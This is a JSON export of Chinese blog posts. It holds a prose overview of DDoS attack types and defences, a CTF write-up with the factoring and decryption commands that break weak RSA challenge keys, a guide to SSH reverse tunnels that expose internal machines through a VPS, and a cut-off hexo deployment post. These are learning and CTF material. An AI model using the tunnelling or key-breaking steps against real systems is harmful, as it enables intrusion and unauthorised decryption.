[{"title":"DDOS攻击简介","url":"http://ohroot.com/2016/09/18/ddos-introduction/","content":"<a id=\"more\"></a>\n<p>最新找工作，笔试经常被问到DDOS的攻击原理和防御，以前学习过一些基础知识，然后耐不住久不用就忘记了，总结下，免得再吃亏</p>\n<h2 id=\"DDOS攻击分类\">DDOS攻击分类</h2><p>DDOS可以分为网络层攻击（SYN-flood、ACK-flood、UDP-flood、ICMP-flood等）、应用层攻击（CC攻击、DNS-flood、慢速连接攻击）。<br>按攻击方式可以分为：反射型、流量放大型、混合型等。</p>\n<p>在讲DDOS原理前我还是先找了一个TCP连接的三次握手，四次分手的流程图，以方便描述一些攻击过程的原理。<br><img src=\"https://img.alicdn.com/imgextra/i3/192713264/TB2IB51XobA11BjSspiXXa7EXXa_!!192713264.jpg\" alt=\"\"></p>\n<h2 id=\"网络层攻击\">网络层攻击</h2><h3 id=\"1-_SYN-flood\">1. SYN-flood</h3><p>TCP 连接三次握手过程中，通过原始套接字发送源地址虚假的SYN数据包、使目标主机永远无法完成三次握手，系统的协议栈队列占满，资源得不到释放造成拒绝服务。</p>\n<p>一些简单的防御方法包括调整内核参数的方法，可以减少等待及重试，加速资源释放，在小流量syn-flood的情况下可以缓解，但流量稍大时完全不抵用。防御syn-flood的常见方法有：syn proxy、syn cookies、首包（第一次请求的syn包）丢弃等。</p>\n<h3 id=\"2-_ACK-flood\">2. ACK-flood</h3><p>对于虚假的ACK包，目标设备会直接回复RST包丢弃连接，所以伤害值远不如syn-flood。DDOS的一种原始方式。</p>\n<h3 id=\"3-_UDP-flood\">3. UDP-flood</h3><p>使用原始套接字伪造大量虚假源地址的UDP包，以DNS协议为主。</p>\n<h3 id=\"4-_ICMP-flood\">4. ICMP-flood</h3><p>Ping洪水，比较古老的方式。</p>\n<hr>\n<h2 id=\"应用层攻击\">应用层攻击</h2><h3 id=\"1-_CC攻击\">1. CC攻击</h3><p>CC攻击(ChallengeCollapsar)的名字源于挑战国内知名安全厂商绿盟的抗DDOS设备-“黑洞”。通过僵尸网络或大量匿名代理服务器，向目标发起大量真实的http请求，最终消耗掉大量的并发资源，拖慢整个网站，造成拒绝服务。</p>\n<p>CC攻击的目的就是占满服务器并发连接数，尽可能使请求避开缓存而直接读数据库，读数据库要找最消耗资源的查询，最好无法利用索引，每个查询都全表扫描，这样就能用最小的攻击资源起到最大的拒绝服务效果。CC攻击就是寻找系统脆弱点占满系统资源导致拒绝服务。</p>\n<h3 id=\"2-_DNS-flood\">2. DNS-flood</h3><p>伪造源地址向目标DNS服务器发送大量DNS请求，而且查找的域名通常不存在。DNS服务器首先会查找是否有对应的缓存，如果查找不到并且该域名无法直接由服务器解析的时候，DNS服务器会向其上层DNS服务器递归查询域名信息。域名解析的过程给服务器带来了很大的负载，最终大量请求导致拒绝服务。</p>\n<h3 id=\"3-_慢速连接攻击\">3. 慢速连接攻击</h3><p>针对http协议，以知名的slowloris攻击为例：先建立http连接，设置一个较大的content-length，每次只发送很少的字节，让服务器一直以为http头部没有传输完成，这样的连接一多很快就会出现连接耗尽。</p>\n<p>目前出现了一些变种，http慢速的post请求和慢速的read请求都是基于相同的原理。<br>其他包括JavaScript-based DDoS、WordPress pingback DDoS和Joomla反射攻击。</p>\n<p><strong>JavaScript-based DDoS</strong>：在海量访问的网页嵌入指向攻击目标网站的恶意JavaScript代码，当互联网用户访问该网页时，则流量被指向攻击目标网站。典型攻击事件是GitHub DDoS攻击。</p>\n<p><strong>WordPress pingback DDoS</strong>：基于wordpress搭建的WEB网站默认开放XML-RPC pingback服务，该服务是用来通知第三方网站blog系统有文章被引用。攻击者假冒攻击目标网站的IP地址给数以万计wordpress站点发送pingback请求，开放pingback服务的网站会向攻击目标网站发送HTTP get请求。</p>\n<h2 id=\"按攻击方式分类\">按攻击方式分类</h2><h3 id=\"反射型\">反射型</h3><p>反射型攻击的本质是利用“质询-应答”式协议，将质询包的源地址通过原始套接字伪造设置为目标地址，则应答的“回包”都被发送至目标，如果回包体积比较大或协议支持递归效果，攻击流量会被放大，成为一种高性价比的流量型攻击。<br>例如通过将SYN包的源地址设置为目标地址，然后向大量的真实TCP服务器发送TCP的SYN包，而这些收到SYN包的TCP服务器为了完成3次握手把SYN|ACK包“应答”给目标地址，完成了一次“反射”攻击，攻击者隐藏了自身。<br>反射型攻击利用的协议目前包括NTP、Chargen、SSDP、DNS、RPC portmap等</p>\n<h3 id=\"流量放大型\">流量放大型</h3><p>通过递归等手法将攻击流量方法的攻击类型</p>\n<h3 id=\"混合型\">混合型</h3><p>即混合多种攻击方式</p>\n<h3 id=\"脉冲型\">脉冲型</h3><p>即DDOS攻击流量呈现脉冲状，难以防御</p>\n<h3 id=\"链路泛洪\">链路泛洪</h3><p>在链路上进行攻击目标的“上一跳”</p>\n<h2 id=\"DDOS攻击防御\">DDOS攻击防御</h2><p>1、近源清洗<br>2、CDN、云清洗<br>在攻击发生时，设置CNAME，进行云清洗<br>3、ADS设备<br>目前在ADS设备里覆盖了3-4,7这三层的解决方案。<br><img src=\"https://img.alicdn.com/imgextra/i4/192713264/TB2Aas8aF_AQeBjSZFyXXb1bXXa_!!192713264.png\" alt=\"ADS\"><br>4、OS/APP层<br>做应用层的一些防护、设置反向代理，根据请求内容，进行请求计数，然后超过一定的次数，阻断或者弹出验证码等</p>\n<p>留待后续继续完善。。。</p>\n<h2 id=\"参考文章\">参考文章</h2><ul>\n<li><a href=\"http://www.ayazero.com/?p=75\" target=\"_blank\" rel=\"external\">浅析大规模DDOS防御架构-应对T级攻防</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s?__biz=MjM5Njc3NjM4MA==&amp;mid=402475339&amp;idx=1&amp;sn=530182906bc56ff37d11cc42abf12f0e\" target=\"_blank\" rel=\"external\">华为《2015僵尸网络与DDoS攻击专题报告》</a></li>\n</ul>\n"},{"title":"CTF中的RSA算法","url":"http://ohroot.com/2016/07/11/rsa-in-ctf/","content":"<a id=\"more\"></a>\n<p>密码算法有很多种，要讲就要讲久了，自行脑补一本厚厚的密码学书。</p>\n<p>我们经常用到的算法包括对称加密算法和非对称加密算法。本文主要介绍CTF中经常遇到的RSA加密题的一些解法</p>\n<h2 id=\"算法原理简介\">算法原理简介</h2><ul>\n<li>随机选择大素数p,q,并计算：</li>\n</ul>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">n = p*q&#10;&#10;\\phi(n) = (p-1)(q-1)</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>选择一个随机数e，<code>1 &lt; e &lt; ϕ(n)</code>，且 <code>gcd(e, ϕ(n)) = 1</code>，并计算:</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#10;d = e^&#123;-1&#125;mod(\\phi(n))</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>选择<code>(e,n)</code>为公钥，<code>d</code>为私钥</p>\n</li>\n</ul>\n<h3 id=\"加密\">加密</h3><p>对明文<code>m &lt; n</code>，其对应的密文为：<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=m^e mod n</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"解密\">解密</h3><p>对于密文c，对应的明文为：<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">m = c^d mod n</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"相关工具\">相关工具</h2><p>首先介绍下我自己改写的一个工具<a href=\"https://github.com/lovebed/rsatools\" target=\"_blank\" rel=\"external\">&gt;&gt;rsatools&lt;&lt;</a>, 该项目主要代码源于<a href=\"https://github.com/Ganapati/RsaCtfTool\" target=\"_blank\" rel=\"external\">RsaCtfTool</a>,我只是对其进行了改写。参加了几次CTF之后，只是想让这个工具能够适用于更多的情况。</p>\n<ul>\n<li>RSA大数分解网站 <a href=\"http://www.factordb.com/index.php\" target=\"_blank\" rel=\"external\">http://www.factordb.com/index.php</a></li>\n<li><p>大数分解平台 <a href=\"https://cloud.sagemath.com/\" target=\"_blank\" rel=\"external\">https://cloud.sagemath.com/</a></p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"title\">factor</span><span class=\"params\">(<span class=\"number\">0</span>x123)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">factor</span><span class=\"params\">(<span class=\"number\">123</span>)</span></span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>RSA-Tool 2</p>\n</li>\n<li><p>yafu 如果两个素数相差很近，可采用费马分解</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"title\">factor</span><span class=\"params\">(<span class=\"number\">0</span>x123)</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">factor</span><span class=\"params\">(<span class=\"number\">123</span>)</span></span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>rsatool.py 标准工具 用于已有p,q生成私钥</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./rsatool<span class=\"class\">.py</span> -<span class=\"tag\">p</span> num1 -<span class=\"tag\">q</span> num2 -o priv.key</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>openssl</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">输出公钥信息</span><br><span class=\"line\">openssl rsa -noout -text -inform PEM -<span class=\"keyword\">in</span> public<span class=\"class\">.key</span> -pubin</span><br><span class=\"line\"></span><br><span class=\"line\">openssl rsautl -decrypt -<span class=\"keyword\">in</span> level1bin<span class=\"class\">.passwd</span><span class=\"class\">.enc</span> -inkey ../priv<span class=\"class\">.key</span> -out level1<span class=\"class\">.passwd</span> -oaep</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"CTF示例\">CTF示例</h2><h3 id=\"安恒CTF\">安恒CTF</h3><p>给出的文件<a href=\"https://raw.githubusercontent.com/lovebed/rsatools/master/demos/%E5%AE%89%E6%81%92ctf/rsa/data.txt%20(2\" target=\"_blank\" rel=\"external\">&gt;&gt;在这里&lt;&lt;</a>),这里就比较直白能看出是RSA加密，然后分解大数直接暴力跑就行了，当时也是专门搞了个脚本处理这种加密。<a href=\"https://raw.githubusercontent.com/lovebed/rsatools/master/rsa.py\" target=\"_blank\" rel=\"external\">&gt;&gt;代码戳这里&lt;&lt;</a>,直接看代码就能明白了</p>\n<h3 id=\"SCTF\">SCTF</h3><p>SCTF的RSA加解密难度较大，我也是在其中学到很多技巧。</p>\n<h4 id=\"level0\">level0</h4><p>第一个压缩包中包含<a href=\"https://raw.githubusercontent.com/lovebed/rsatools/master/demos/sctf/rsa1/level0/level1.passwd.enc\" target=\"_blank\" rel=\"external\">密文</a>，以及<a href=\"https://raw.githubusercontent.com/lovebed/rsatools/master/demos/sctf/rsa1/level0/public.key\" target=\"_blank\" rel=\"external\">公钥证书</a>.我们需要从公钥证书中找到大数N，然后去分解大素数<br>采用我自己改写的脚本可直接输出公钥中的N和E：<br><figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python RsaCtfTool.py --pkey ..<span class=\"regexp\">/sctf/</span>rsa1<span class=\"regexp\">/level0/</span><span class=\"keyword\">public</span>.key</span><br></pre></td></tr></table></figure></p>\n<p>N = 18762288330807505336471569952368628968038915032364773203018829070696227411217877868952724842039756288121734420378039301563905037169196320417706839549744629044465352679919380329435329653365900312498712121432190200717072138327379844913608851715404086200984072727408758802012147296753317519612628629535373054730645471938738605688629618951071483635716677866010394704066696480858977560809007683074249820225609075518509112704549293147063971302640066331096645041521401155565628466857211261242132897152403975836705170916276159246187173035660820037820087171748591660487636434105623595720788169970861783452500198572918584010881<br>e = 65537<br>直接在sagemath中跑：<br><figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">factor<span class=\"comment\">(18762288330807505336471569952368628968038915032364773203018829070696227411217877868952724842039756288121734420378039301563905037169196320417706839549744629044465352679919380329435329653365900312498712121432190200717072138327379844913608851715404086200984072727408758802012147296753317519612628629535373054730645471938738605688629618951071483635716677866010394704066696480858977560809007683074249820225609075518509112704549293147063971302640066331096645041521401155565628466857211261242132897152403975836705170916276159246187173035660820037820087171748591660487636434105623595720788169970861783452500198572918584010881)</span></span><br><span class=\"line\"><span class=\"title\">#output</span><br><span class=\"line\">250527704258269</span> * <span class=\"number\">74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349</span></span><br></pre></td></tr></table></figure></p>\n<p>这个实测RSA-Tool 2 中还要快一些，然后还是用脚本解密<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python RsaCtfTool<span class=\"class\">.py</span> --pqne <span class=\"number\">250527704258269</span>,<span class=\"number\">74891071972884336452892671945839935839027130680745292701175368094445819328761543101567760612778187287503041052186054409602799660254304070752542327616415127619185118484301676127655806327719998855075907042722072624352495417865982621374198943186383488123852345021090112675763096388320624127451586578874243946255833495297552979177208715296225146999614483257176865867572412311362252398105201644557511678179053171328641678681062496129308882700731534684329411768904920421185529144505494827908706070460177001921614692189821267467546120600239688527687872217881231173729468019623441005792563703237475678063375349</span>,<span class=\"number\">18762288330807505336471569952368628968038915032364773203018829070696227411217877868952724842039756288121734420378039301563905037169196320417706839549744629044465352679919380329435329653365900312498712121432190200717072138327379844913608851715404086200984072727408758802012147296753317519612628629535373054730645471938738605688629618951071483635716677866010394704066696480858977560809007683074249820225609075518509112704549293147063971302640066331096645041521401155565628466857211261242132897152403975836705170916276159246187173035660820037820087171748591660487636434105623595720788169970861783452500198572918584010881</span>,<span class=\"number\">65537</span> --crypto ../sctf/rsa1/level0/level1<span class=\"class\">.passwd</span><span class=\"class\">.enc</span> --format base64</span><br></pre></td></tr></table></figure></p>\n<p>解出来时乱码，我们就要考虑填充的问题,我写的脚本还没支持不同的填充，尝试用openssl解密，成功解密<br><figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat ..<span class=\"regexp\">/sctf/</span>rsa1<span class=\"regexp\">/level0/</span>level1.passwd.enc | base64 -d &gt; ..<span class=\"regexp\">/sctf/</span>rsa1<span class=\"regexp\">/level0/</span>level1bin.passwd.enc</span><br><span class=\"line\">openssl rsautl -decrypt -<span class=\"keyword\">in</span> ..<span class=\"regexp\">/sctf/</span>rsa1<span class=\"regexp\">/level0/</span>level1bin.passwd.enc -inkey ..<span class=\"regexp\">/sctf/</span>rsa1<span class=\"regexp\">/priv.key -out ../</span>sctf<span class=\"regexp\">/rsa1/</span>level0/level1.passwd -oaep</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"level1\">level1</h4><p>这一层还是查看N&amp;e,N&amp;e，然后分解大数，sage很久都没分出来，RSA-Tool 2也是，最终发现是P和Q相近，可采用费马分解。我们可以采用yafu这个工具进行分解。<br><figure class=\"highlight makefile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">factor(24635380199162576175626733825654993088774186468424341251485528171539392839329146412615013362980283492199482296250229443925899183941601282092332843476617277156184507685928193519623765855782976047363883665283424473545877969718710272046261654326391840252190462805782777380937446430987284386172226304759726517529843564412091984328980979115111158624673855166379221415935217206920980564900414671064827167187417932475583509599802648238573603298428445177957392893928492353538844661418085667022331283805225000341955464473332333141637604132197773189903937879276873131228814365139541968760521539920817629563995110317306270531197)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># output</span></span><br><span class=\"line\"><span class=\"constant\">P309</span> = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496383</span><br><span class=\"line\"><span class=\"constant\">P309</span> = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496259</span><br></pre></td></tr></table></figure></p>\n<p>然后同level0的方式进入level2<br><figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python RsaCtfTool.py --pqne <span class=\"number\">156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496383</span>,<span class=\"number\">156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496259</span>,<span class=\"number\">24635380199162576175626733825654993088774186468424341251485528171539392839329146412615013362980283492199482296250229443925899183941601282092332843476617277156184507685928193519623765855782976047363883665283424473545877969718710272046261654326391840252190462805782777380937446430987284386172226304759726517529843564412091984328980979115111158624673855166379221415935217206920980564900414671064827167187417932475583509599802648238573603298428445177957392893928492353538844661418085667022331283805225000341955464473332333141637604132197773189903937879276873131228814365139541968760521539920817629563995110317306270531197</span>,<span class=\"number\">65537</span> --pri</span><br><span class=\"line\">openssl rsautl -decrypt -<span class=\"keyword\">in</span> ..<span class=\"regexp\">/sctf/</span>rsa1<span class=\"regexp\">/level0/</span>level1<span class=\"regexp\">/level2.passwd.enc -inkey ../</span>sctf<span class=\"regexp\">/rsa1/</span>level0<span class=\"regexp\">/level1/</span>pri.key -out ..<span class=\"regexp\">/sctf/</span>rsa1<span class=\"regexp\">/level0/</span>level1/level2.passwd</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"level2\">level2</h4><p>这一题用同样的方法可以看到E很大，存在低解密指数攻击（Wiener’s Attack），e太大，可直接算出d<br><figure class=\"highlight actionscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"n\"</span> <span class=\"keyword\">is</span>:<span class=\"number\">310417953704722170730847224402877983815425243802949146921747155554873214220856824312098961643471840575991636613043700912852694476430642621109657293199766030858364981594359341335457943511388291654144608627164424697545853589150385759857708455254761227678476750080293606809444462895661894497915336651794981901683</span></span><br><span class=\"line\"><span class=\"string\">\"e\"</span> <span class=\"keyword\">is</span>:<span class=\"number\">180160219817657029643391514538629205160228298622505654076129556003630962924040643558658232436259668646427759588151297967578950689360985724312726411880635697242206899247553123368979139238838216404056134080086977722515560207477455248034027633490880147280702252198966243510960816978036425871522668587833586334027</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight groovy\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python RsaCtfTool.py --pkey ..<span class=\"regexp\">/sctf/</span>rsa1<span class=\"regexp\">/level0/</span>level1<span class=\"regexp\">/level2/</span><span class=\"keyword\">public</span>.key --pri</span><br><span class=\"line\">openssl rsautl -decrypt -<span class=\"keyword\">in</span> ..<span class=\"regexp\">/sctf/</span>rsa1<span class=\"regexp\">/level0/</span>level1<span class=\"regexp\">/level2/</span>level3.passwd.enc -inkey ..<span class=\"regexp\">/sctf/</span>rsa1<span class=\"regexp\">/level0/</span>level1<span class=\"regexp\">/level2/</span>pri.key -out ..<span class=\"regexp\">/sctf/</span>rsa1<span class=\"regexp\">/level0/</span>level1<span class=\"regexp\">/level2/</span>level3.passwd</span><br></pre></td></tr></table></figure>\n<p>至此rsa第一题通关</p>\n<h4 id=\"level5\">level5</h4><p>这个也是RSA第二题，下面的题都是针对RSA特定情形下的攻击，该题考察共享素数攻击，两个模共享一个素因子，可以用gcd快速算出模的共享素因子。题目给了一个流量包syc_security_system_traffic2.pcap，分析流量包，可以看到10个明文TCP会话，会话中包含加密的公钥（n，e）和加密后的level5的密码。其中e都是65537。所以随机选取两个n，这里我们选取第4个和第5个会话，写个sage脚本得到p和q。事实上你会发现这里所有的n都不是互素的。<br><a href=\"https://raw.githubusercontent.com/lovebed/rsatools/master/demos/sctf/rsa2/sage.py\" target=\"_blank\" rel=\"external\">&gt;&gt;sage脚本&lt;&lt;</a></p>\n<h4 id=\"level3\">level3</h4><p>这题可以使用相关消息攻击（Franklin-Reiter related-message attack），也可以采用Hastad attack。最后看writeup，有好多种解法。通信过程中有一组还使用了同一个公钥，解法非常多。<br>最后，我用改写的脚本直接解密，<a href=\"https://github.com/lovebed/rsatools/blob/master/demos/sctf/rsa3/myrsa.py\" target=\"_blank\" rel=\"external\">解密脚本</a></p>\n<h4 id=\"level4\">level4</h4><p>这题考察广播攻击（Hastad’s Broadcast Attack），e较小，用相同的e和不同的n加密线性相关的消息，可以用多个密文m和模n算出明文。我也是找到了类似的题，改了改别人的脚本解出该题<a href=\"https://raw.githubusercontent.com/lovebed/rsatools/master/demos/sctf/rsa3/mayday/flag.py\" target=\"_blank\" rel=\"external\">&gt;&gt;code&lt;&lt;</a>。详细分析可以<a href=\"https://github.com/pcchou/ctf-writeups/tree/master/2016/tw-edu-ctf/mayday\" target=\"_blank\" rel=\"external\">看这里</a>。</p>\n<h2 id=\"总结\">总结</h2><p>本文是在做了几个CTF题之后总结了下RSA相关题的解法，希望能对大家有所帮助，这类题还是比较简单，一般问题现在网上都能搜到答案。我想去做一个通用的工具，但是偶尔又感觉没什么意义，一直未果。</p>\n"},{"title":"ssh端口转发","url":"http://ohroot.com/2016/04/13/ssh-port-forwarding/","content":"<a id=\"more\"></a>\n<p>ssh端口转发在渗透测试中是一个非常好用，可实现将本地端口转发到远程端口，或者本地端口到本地端口，总之很多姿势，之前在乌云drops上经常看别人提到这个，一直没有去亲自实战。终于有一天，我们需要将内网的机器映射到外网，通常这个时候我都会选择路由器端口转发，但是，不幸的是我们的光猫不是桥接模式。。。总之就是不能映射出去，于是我想到了使用ssh端口映射。</p>\n<p>这种方法肯定不是长久之计，我们也没打算长久映射，下面开始说方法</p>\n<h2 id=\"ssh参数说明\">ssh参数说明</h2><p>首先将下文可能用到的参数说明如下：<br><figure class=\"highlight haml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-<span class=\"ruby\">f    要求 ssh 在执行命令前退至后台. 它用于当 ssh 准备询问口令或密语, 但是用户希望它在后台进行. 该选项隐含了 -n 选项. 在远端机器上启动</span><br><span class=\"line\"></span>-<span class=\"ruby\"><span class=\"constant\">N</span>    不执行远程命令. 用于转发端口.</span><br><span class=\"line\"></span>-<span class=\"ruby\"><span class=\"constant\">C</span>    要求进行数据压缩 (包括 stdin, stdout, stderr 以及转发 <span class=\"constant\">X11</span> 和 <span class=\"constant\">TCP</span>/<span class=\"constant\">IP</span> 连接 的数据).压缩算法和 gzip(<span class=\"number\">1</span>) 的一样, 协议第一版中,压缩级别 “level” 用<span class=\"constant\">CompressionLevel</span> 选项控制. 压缩技术在 modem 线路或其他慢速连接上很有用, 但是在高速网络上反而 可能降低速度.可以在配置文件中对每个主机单独设定这个参数.</span><br><span class=\"line\"></span>-<span class=\"ruby\">g    允许远端主机连接本地转发的端口</span><br><span class=\"line\"></span>-<span class=\"ruby\">q    安静模式. 消除所有的警告和诊断信息</span><br><span class=\"line\"></span>-<span class=\"ruby\"><span class=\"constant\">T</span>    禁止分配伪终端</span><br><span class=\"line\"></span>-<span class=\"ruby\">n    把 stdin 重定向到 /dev/null (实际上防止从 stdin 读取数据).  ssh 在后台运行时一定会用到这个选项. 它的常用技巧是远程运行 <span class=\"constant\">X11</span> 程序.</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"在_Linux_上设置反向_SSH_隧道\">在 Linux 上设置反向 SSH 隧道</h2><p>在内网机器上，运行如下命令，其中1.1.1.1为VPS的IP，运行后需要输入relayserver_user的密码<br><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">ssh</span> <span class=\"tag\">-fN</span> <span class=\"tag\">-R</span> 10022<span class=\"pseudo\">:localhost</span><span class=\"pseudo\">:22</span> <span class=\"tag\">relayserver_user</span><span class=\"at_rule\">@<span class=\"keyword\">1.1.1.1</span></span></span><br></pre></td></tr></table></figure></p>\n<p>然后在VPS上查看10022端口，端口开放说明成功了<br><figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo netstat -nap <span class=\"string\">| grep 10022</span></span><br><span class=\"line\"><span class=\"preprocessor\"># tcp 0 0 127.0.0.1:10022 0.0.0.0:* LISTEN 8493/sshd</span></span><br></pre></td></tr></table></figure></p>\n<p>然后可以在VPS上运行命令：<br><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title\">ssh</span> -p <span class=\"number\">10022</span> homeserver_user<span class=\"variable\">@localhost</span></span><br></pre></td></tr></table></figure></p>\n<p>即可连接内网的机器，同样的道理，我们把22端口换成80端口，即可将80端口映射到VPS上，在VPS上可以使用curl进行测试。</p>\n<h2 id=\"VPS做转发\">VPS做转发</h2><p>我们需要的不仅仅是自己登陆VPS可以操作内网的机器，我们需要的是任意一台主机访问我VPS上的指定端口，然后可以转发到内网，姿势如下：<br><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">ssh</span> <span class=\"tag\">-qTfnN</span> <span class=\"tag\">-R</span> <span class=\"pseudo\">:8888</span><span class=\"pseudo\">:127</span><span class=\"class\">.0</span><span class=\"class\">.0</span><span class=\"class\">.1</span><span class=\"pseudo\">:80</span> <span class=\"tag\">root</span><span class=\"at_rule\">@<span class=\"keyword\">1.1.1.1</span> -o GatewayPorts=yes</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"参考链接:\">参考链接:</h2><ul>\n<li><a href=\"http://blog.jobbole.com/89281/\" target=\"_blank\" rel=\"external\">如何通过反向 SSH 隧道访问 NAT 后面的 Linux 服务器</a></li>\n<li><a href=\"https://github.com/l3m0n/pentest_study\" target=\"_blank\" rel=\"external\">pentest_study</a></li>\n<li><a href=\"http://drops.wooyun.org/tips/5234\" target=\"_blank\" rel=\"external\">内网渗透随想</a></li>\n</ul>\n"},{"title":"hexo部署在github和coding进行分流","url":"http://ohroot.com/2016/04/12/hexo-deploy-with-github-and-coding/","content":"<a id=\"more\"></a>\n<p>本文主要描述将hexo博客同时搭建在github和coding上，并实现分流，使得国内用户访问时访问的是coding上的博客，国外用户访问时访问的是github上的博客</p>\n<p>首先贴出<code>_config.yml</code>中的配置，使得<code>hexo d</code>部署的时候可以同时将代码推送到github和coding。<br><figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">deploy</span>:</span><br><span class=\"line\">- <span class=\"attribute\">type</span>: git</span><br><span class=\"line\">  <span class=\"attribute\">repo</span>: git<span class=\"variable\">@github</span>.<span class=\"attribute\">com</span>:username/username.github.io.git</span><br><span class=\"line\">- <span class=\"attribute\">type</span>: git</span><br><span class=\"line\">  <span class=\"attribute\">repo</span>: git<span class=\"variable\">@git</span>.coding.<span class=\"attribute\">net</span>:username/username.git</span><br><span class=\"line\">  <span class=\"attribute\">branch</span>: gitcafe-pages</span><br></pre></td></tr></table></figure></p>\n<p>我以前国内使用的是gitcafe，后来gitcafe被coding收购了又迁到coding，所以你的上述配置可能需要稍作修改。</p>\n<p>刚开始我做的分流是主域名解析到github然后，www子域名解析到coding，这个方案显然不好。</p>\n<p>后来，我发现在godaddy上域名解析有点慢，就把域名解析迁移到dnspod上了，这个方法不详述，可查看<a 